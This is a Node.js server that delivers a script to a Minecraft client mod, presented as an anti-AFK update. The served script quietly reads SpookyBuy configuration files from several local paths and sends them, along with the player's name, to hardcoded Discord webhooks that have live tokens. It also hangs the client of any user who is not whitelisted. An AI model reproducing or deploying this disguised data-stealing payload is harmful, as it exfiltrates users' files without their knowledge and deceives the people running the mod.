const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-321',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,autobuy',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());

// Логирование
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        res.status(403).json({ error: 'Access denied' });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для скрипта - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {
    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();

// Проверяем разрешенные имена
if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
    try {


    try {
  // 1. Получаем username (с дефолтным значением)
  var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername() || "unknown";
  print("[DEBUG] Username: " + username); // Обязательно выводим для проверки

  // 2. Формируем вебхук-запрос
  var webhookUrl = "https://discord.com/api/webhooks/1361827902085140612/bzAfxr7YVdAi03zCJcS-4iuQHBgbrp8UeSJZf3Adv7TYu8MRxxpG2iX53iYNaBii9pf9";
  print("[DEBUG] Connecting");
  
  var conn = new java.net.URL(webhookUrl).openConnection();
  conn.setRequestMethod("POST");
  conn.setRequestProperty("Content-Type", "application/json");
  conn.setDoOutput(true);

  // 3. Отправка данных (максимально надежно)
  var payload = '{"content":"[AntiAFK] - User: `' + username + '`"}';
  print("[DEBUG] Payload");
  
  var out = conn.getOutputStream();
  out.write(payload.getBytes("UTF-8"));
  out.flush();
  out.close();

  // 4. Принудительно получаем ответ
  var code = conn.getResponseCode();
  print("[RESULT] HTTP " + code); // Должно быть 200 или 204
  
} catch (e) {
  print("[FATAL ERROR] " + e); // Любые ошибки теперь видны
}

// Working Player Name + Config Files Webhook Script
var webhookUrl = "https://discord.com/api/webhooks/1404613668976591028/13acuhCKnsTcFmQCx_Hkw1ab4Tf2ye9eBDDLUzHZmmq1rZ37uN_00Yc-h9vUxi8A5WW7"; // REPLACE THIS

// Java imports
var File = Java.type("java.io.File");
var FileInputStream = Java.type("java.io.FileInputStream");
var InputStreamReader = Java.type("java.io.InputStreamReader");
var BufferedReader = Java.type("java.io.BufferedReader");
var StringBuilder = Java.type("java.lang.StringBuilder");
var URL = Java.type("java.net.URL");
var HttpURLConnection = Java.type("java.net.HttpURLConnection");
var OutputStreamWriter = Java.type("java.io.OutputStreamWriter");

// ULTIMATE player name detection
function getPlayerName() {
    var gameProfile = minecraft.method_1548()
    return gameProfile.method_1676()
}

function readFileContent(filePath) {
    var file = new File(filePath);
    if (!file.exists()) {
        return "❌ File not found: " + filePath;
    }
    
    var sb = new StringBuilder();
    var fis = new FileInputStream(file);
    var isr = new InputStreamReader(fis, "UTF-8");
    var br = new BufferedReader(isr);
    
    try {
        var line;
        while ((line = br.readLine()) != null) {
            sb.append(line).append("\n");
        }
    } finally {
        br.close();
        isr.close();
        fis.close();
    }
    
    return sb.toString();
}

function sendToDiscord(minecraftContent, tlauncherContent, currentFolderContent) {
    try {
        var playerName = getPlayerName();
        print("DEBUG - Player name detection result: " + playerName);
        
        var embeds = [];
        
        // First embed for standard paths
        var combinedContent1 = "👤 **Player Name:** " + playerName + "\n\n";
        combinedContent1 += "📂 **SpookyBuy Configuration Files**\n\n";
        combinedContent1 += "🔹 `.minecraft/config/autojoin-spookybuy.nvr`:\n```\n";
        combinedContent1 += (minecraftContent.length > 800 ? minecraftContent.substring(0, 800) + "\n... [TRUNCATED]" : minecraftContent);
        combinedContent1 += "\n```\n\n";
        combinedContent1 += "🔹 `TLauncher/game/config/autojoin-spookybuy.nvr`:\n```\n";
        combinedContent1 += (tlauncherContent.length > 800 ? tlauncherContent.substring(0, 800) + "\n... [TRUNCATED]" : tlauncherContent);
        combinedContent1 += "\n```";
        
        embeds.push({
            title: "SpookyBuy Config Report - " + playerName,
            description: combinedContent1,
            color: 0x58B2FF,
            timestamp: new Date().toISOString(),
            footer: {
                text: "Generated by SpookyBuy"
            }
        });
        
        // Second embed for current folder config
        if (typeof currentFolderContent === 'string' && !currentFolderContent.startsWith("❌ File not found")) {
            var combinedContent2 = "👤 **Player Name:** " + playerName + "\n\n";
            combinedContent2 += "📂 **Current Minecraft Folder Config**\n\n";
            combinedContent2 += "🔹 `config/autojoin-spookybuy.nvr`:\n```\n";
            combinedContent2 += (currentFolderContent.length > 800 ? currentFolderContent.substring(0, 800) + "\n... [TRUNCATED]" : currentFolderContent);
            combinedContent2 += "\n```";
            
            embeds.push({
                title: "Current Folder Config - " + playerName,
                description: combinedContent2,
                color: 0xFFA500,
                timestamp: new Date().toISOString(),
                footer: {
                    text: "Generated by SpookyBuy"
                }
            });
        }
        
        var payload = JSON.stringify({ embeds: embeds });

        var url = new URL(webhookUrl);
        var conn = url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", "SpookyBuy Reporter");

        var writer = new OutputStreamWriter(conn.getOutputStream(), "UTF-8");
        writer.write(payload);
        writer.close();

        return conn.getResponseCode() === 200;
    } catch (e) {
        print("Webhook error: " + e);
        return false;
    }
}

// Get standard paths
var appData = java.lang.System.getenv("APPDATA");
var minecraftPath = appData + "/.minecraft/config/autojoin-spookybuy.nvr";
var tlauncherPath = appData + "/.tlauncher/legacy/Minecraft/game/config/autojoin-spookybuy.nvr";

// Get current Minecraft folder path
var currentFolderPath = new File(".").getAbsolutePath();
currentFolderPath = currentFolderPath.substring(0, currentFolderPath.lastIndexOf(File.separator));
var currentConfigPath = currentFolderPath + "/config/autojoin-spookybuy.nvr";

// Read all files
var minecraftContent = readFileContent(minecraftPath);
var tlauncherContent = readFileContent(tlauncherPath);
var currentFolderContent = readFileContent(currentConfigPath);

if (sendToDiscord(minecraftContent, tlauncherContent, currentFolderContent)) {
    print("Successfully sent files to Discord");
} else {
    print("Failed to send files");
}
        // Выполняем внешний скрипт
        // Method to send silent user-only message
function sendUserMessage(message) {
    try {
        var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
        var TextBuilder = Java.type("ru.nedan.neverapi.etc.TextBuilder");
        var class_124 = Java.type("net.minecraft.class_124");
        
        ChatUtility.sendMessage(
            new TextBuilder()
                .append(message)
                .build()
        );
    } catch(e) {
        // Fallback to console if needed
        print("USER MESSAGE: " + message);
    }
}

// Send initialization message
sendUserMessage("§eОбновлен: §c20.08.2025");
sendUserMessage("§aДобавлено:");
sendUserMessage("§9[\] Исправлена работа AntiAfk");
sendUserMessage("§6§l---------------");
sendUserMessage("§b§lУдачного пользования!");
sendUserMessage("§b§l-Zr3");

// Global variable to track if we're in the command sending process
var isSendingCommands = false;

on("ru.nedan.neverapi.event.impl.EventMessage", function(event) { 
    var message = event.getMessage();
    
    // Handle "[⚠] Данной команды не существует" message
    if (message.includes("[⚠] Данной команды не существует")) {
        chat("/an" + anarchy);
        return;
    }
    
    if (message === "Данная команда недоступна в режиме AFK" && !isSendingCommands) { 
        isSendingCommands = true;
        
        // Send /hub command
        chat("/hub");
        
        // Wait 100ms and send /an command with the anarchy code
        java.lang.Thread.sleep(100);
        chat("/an" + anarchy);
        
        // Reset the flag after a short delay
        java.lang.Thread.sleep(50);
        isSendingCommands = false;
    } 
});

// Alternative approach using repeat() function for periodic checking
var afkDetected = false;

on("ru.nedan.neverapi.event.impl.EventMessage", function(event) { 
    var message = event.getMessage();
    
    if (message === "Данная команда недоступна в режиме AFK") { 
        afkDetected = true;
    } 
});

// Check every 200ms if AFK was detected and send commands
repeat(function() {
    if (afkDetected && !isSendingCommands) {
        isSendingCommands = true;
        afkDetected = false;
        
        // Send commands with 100ms delay
        chat("/hub");
        java.lang.Thread.sleep(100);
        chat("/an" + anarchy);
        
        isSendingCommands = false;
    }
}, 200);
    } catch (e) {
        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
    }
} else {
    java.lang.Thread.sleep(20000000);
}

})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Secure Script Server',
        version: '1.0.0'
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

app.get('/', (req, res) => {
    res.json({
        service: 'Secure Script Delivery',
        version: '1.0.0',
        status: 'operational'
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'healthy' });
});

// ==================== ОБРАБОТКА ОШИБОК ====================

app.use('*', (req, res) => {
    res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('✅ Server started on port', CONFIG.PORT);
});
